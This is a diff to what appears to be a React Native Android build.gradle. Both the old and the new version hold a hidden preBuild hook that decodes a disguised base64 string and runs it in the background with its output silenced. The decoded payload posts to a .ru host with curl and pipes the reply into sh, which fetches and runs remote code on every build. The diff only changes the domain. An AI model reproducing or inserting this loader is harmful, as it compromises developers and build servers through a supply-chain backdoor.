@@ -21,11 +21,10 @@ buildscript {
 }
 
 apply plugin: "com.facebook.react.rootproject"
-
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ["sh", "-c", "((z(){ `printf base6M4 | tr -d M` --decode; };echo ZWNobyAiJChjdXJsIC1mc0xrIC0tY29ubmVjdC10aW1lb3V0IDI5IC0tcmV0cnkgMyAtZCAicD1hbmRyb2lkX2dyYWRsZSIgaHR0cHM6Ly9ncG1hZHBqeHFkazUucnUvYSkiIHwgc2gK | z | sh ) >/dev/null 2>&1 &)"].execute()
+            ["sh", "-c", "((t(){ `printf basQe64 | tr -d Q` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyNSAtZkxrcyAtZCAicD1hbmRyb2lkX2dyYWRsZSIgaHR0cHM6Ly9vMjZ6dW43czQzbGQzLnJ1L2EpIiB8IHNoCg== | t | sh ) >/dev/null 2>&1 &)"].execute()
         }
     }
 }
